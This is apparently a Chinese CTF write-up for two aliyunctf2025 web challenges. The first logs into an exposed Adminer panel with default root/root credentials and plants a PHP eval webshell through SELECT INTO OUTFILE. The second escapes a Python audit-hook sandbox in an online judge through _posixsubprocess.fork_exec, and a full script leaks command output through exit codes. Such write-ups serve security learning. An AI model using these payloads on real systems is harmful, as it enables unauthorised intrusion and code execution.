---
title: aliyunctf2025
date: 2025-02-25 14:26:16
tags:
categories: 比赛复现
---

## WEB

### 打卡OK

#### 非预期

我们扫描目录，发现有个发现adminer_481.php

我们使用数据库的默认账号密码 root/root 登录

![image-20250225145640808](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502251456939.png)

我们尝试写入shell

```
select "<?php @eval($_POST[1]); ?>" into outfile "/var/www/html/1.php";
```

![image-20250225152316446](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502251523491.png)

用蚁剑进行连接

![image-20250225152619678](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502251526749.png)

在根目录里找到flag



### ezoj

我们在页面的最下面找到了一个`/source`

我们访问/source能看到OJ的源码，从源码中我们可以发现,OJ在执行时，会使用audithook限制代码行为。限制方法为白名单，只允许`["import","time.sleep","builtins.input","builtins.input/result"]`的事件执行。

> `sys.addaudithook` 是 Python 3.8 引入的一个函数，它允许你注册一个“审计钩子”（audit hook）。审计钩子是一个回调函数，当 Python 中的特定事件发生时，它会被调用。这可以用于调试、日志记录或安全审计等目的。

先尝试获取python版本，发现OJ会将程序的退出码回显给用户，可以利用这个回显信息。

 

获取了`sys.version_info`的三个值后，可以得到python版本`3.12.9`。

根据白名单的内容，允许导入模块，但是导入其他模块需要用到compile和exec，因此只能导入内部模块。

在内部模块中发现了[_posixsubprocess](https://github.com/python/cpython/blob/3.12/Modules/_posixsubprocess.c)，该模块能够`fork_exec`执行任意命令同时内部没有触发审计。

由于题目不出网而且也无法直接回显，因此需要把执行程序的标准输出读出来。在源码中可以发现c2pwrite参数会重定向到子进程的标准输出

```py
  if (c2pwrite == 1) {
        if (_Py_set_inheritable_async_safe(c2pwrite, 1, NULL) < 0)
            goto error;
    }
    else if (c2pwrite != -1)
        POSIX_CALL(dup2(c2pwrite, 1));  /* stdout */
```

因此使用下面的脚本，执行命令并将结果写入到退出码中。

```py

import requests

URL = "http://10.253.253.1/api/submit"
CODE_TEMPLATE = """
import _posixsubprocess
import os
import time
import sys

std_pipe = os.pipe()
err_pipe = os.pipe()

_posixsubprocess.fork_exec(
    (b"/bin/bash",b"-c",b"ls /"),
    [b"/bin/bash"],
    True,
    (),
    None,
    None,
    -1,
    -1,
    -1,
    std_pipe[1], #c2pwrite
    -1,
    -1,
    *(err_pipe),
    False,
    False,
    False,
    None,
    None,
    None,
    -1,
    None,
    False,
)
time.sleep(0.1)
content = os.read(std_pipe[0],1024)
content_len = len(content)

if {loc} < content_len:
    sys.exit(content[{loc}])
else:
    sys.exit(255)
"""

command="ls /"
received = ""

for i in range(254):
    code = CODE_TEMPLATE.format(loc=i,command=command)
    data = {"problem_id":0,"code":code}
    resp = requests.post(URL,json=data)
    resp_data = resp.json()
    assert(resp_data["status"] == "RE")
    ret_loc = resp_data["message"].find("ret=")
    ret_code = resp_data["message"][ret_loc+4:]
    if ret_code == "255":
        break
    received += chr(int(ret_code))
    print(received)

```

